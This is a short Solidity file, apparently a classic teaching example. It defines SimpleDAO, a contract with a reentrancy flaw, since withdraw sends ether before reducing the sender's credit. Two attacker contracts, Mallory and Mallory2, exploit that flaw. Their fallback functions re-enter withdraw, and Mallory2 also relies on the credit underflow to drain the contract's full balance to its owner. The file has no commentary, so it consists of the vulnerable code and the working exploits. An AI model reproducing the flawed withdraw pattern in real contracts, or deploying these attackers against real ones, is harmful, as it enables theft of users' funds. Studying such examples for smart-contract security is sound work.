pragma solidity ^0.4.2;

contract SimpleDAO {   
  mapping (address => uint) public credit;
    
  function donate(address to) payable {
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}


contract Mallory {
  SimpleDAO public dao;
  address owner;

  function Mallory(SimpleDAO addr){
    owner = msg.sender;
    dao = addr;
  }
  
  function getJackpot() { 
    bool res = owner.send(this.balance); 
  }

  function() payable { 
    dao.withdraw(dao.queryCredit(this)); 
  }
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner; 
  bool public performAttack = true;

  function Mallory2(SimpleDAO addr){
    owner = msg.sender;
    dao = addr;
  }
    
  function attack() payable{
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot(){
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}
